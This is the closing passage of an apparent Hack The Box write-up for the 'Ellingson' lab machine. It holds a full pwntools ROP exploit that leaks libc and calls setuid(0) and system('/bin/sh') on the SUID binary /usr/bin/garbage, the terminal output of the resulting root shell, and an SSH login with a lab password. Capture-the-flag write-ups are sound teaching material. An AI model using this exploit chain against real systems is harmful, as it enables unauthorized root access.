	<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked __libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">leak</span>

<span class="k">def</span> <span class="nf">suid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">SUID</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'setuid'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SUID</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">RET</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">BIN_SH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>
	<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>

	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"/bin/sh: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">))</span>
	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>

	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>

<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Calculated libc address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Setting uid to 0"</span><span class="p">)</span>

<span class="n">suid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
<span class="n">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span> 
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="o">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">margo</span><span class="err">@</span><span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span>
    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mi">18</span><span class="p">.</span><span class="mo">04</span>
    <span class="n">OS</span><span class="o">:</span>       <span class="n">linux</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span>
    <span class="n">Version</span><span class="o">:</span>  <span class="mi">4</span><span class="p">.</span><span class="mi">15</span><span class="p">.</span><span class="mi">0</span>
    <span class="n">ASLR</span><span class="o">:</span>     <span class="n">Enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="err">'</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span> <span class="n">on</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">8111</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">:</span> <span class="mh">0x401050</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x403ff0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="o">:</span> <span class="mh">0x40179b</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x7f0e56addab0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Calculated</span> <span class="n">libc</span> <span class="n">address</span><span class="o">:</span> <span class="mh">0x7f0e56abc000</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">uid</span> <span class="n">to</span> <span class="mi">0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">:</span> <span class="mh">0x7f0e56c6fe9a</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">system</span><span class="o">:</span> <span class="mh">0x7f0e56b0b440</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
 
<span class="n">access</span> <span class="n">denied</span><span class="p">.</span>
<span class="cp"># $ whoami
</span><span class="n">root</span>
<span class="cp"># $ id
</span><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span>
<span class="cp"># $  
</span></code></pre></div></div>
<p><img src="/images/hackthebox/ellingson/12.png" alt="">
<br><br>And we owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.
<br>
<br>
<br>Previous Hack The Box write-up : <a href="/hack-the-box/writeup/">Hack The Box - Writeup</a>
<br>Next Hack The Box write-up: <a href="/hack-the-box/safe/">Hack The Box - Safe</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/craft/">
            Hack The Box - Craft
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/smasher2/">
            Hack The Box - Smasher2
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/wall/">
            Hack The Box - Wall
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-2">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/kernel-exploitation/" class="set-1">kernel-exploitation</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/mmap/" class="set-1">mmap</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/waf/" class="set-1">waf</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
